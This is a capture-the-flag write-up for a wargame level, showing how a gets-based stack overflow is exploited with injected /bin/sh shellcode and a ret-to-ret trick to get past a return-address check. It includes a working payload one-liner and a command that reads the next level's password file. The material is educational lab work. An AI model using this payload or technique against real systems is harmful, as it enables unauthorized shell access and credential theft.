@@ -1,0 +1,15 @@
+Using gdb we can see that the main function call the function "p".
+This one call "gets" and then print the string.
+Knowing that we will make a bufferoverflow exploit.
+We will inject a shellcode that will start a shell and the bufferoverflow will provide a way to jump to the address of the shellcode.
+Problem is that the is a check to verify that the return address of the function does not start with 0xb0000000 otherwise it stop.
+Because of this restriction we can't jump to the address of the shellcode on the stack.
+To bypass this restriction we will return the address of the return of it own function, thanks to this we will "jump" 4 byts and the next return will jump and find the shellcode and execute it to start a shell.
+(Short shellcode found on https://dhavalkapil.com/blogs/Shellcode-Injection)
+
+python -c 'print "\x90"*16 + "\x31\xc0\x68\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x50\x89\xe1\xb0\x0b\xcd\x80" + "\x90"*40 + "\x3e\x85\x04\x08\xa0\xf6\xff\xbf"' > /tmp/f && cat /tmp/f - | ~/level2
+
+(first arg is "/bin/sh" second is address of first and third is 0, to execute execve, we place 11(0x0b) in %al and call system (int 80) to execut said function(11 = execve))
+
+We may need to change address fo the start of the buffer to match the first 16 0x90 (may vary depending of the machine +-16)
+We can now get the flag with: cat /home/user/level3/.pass
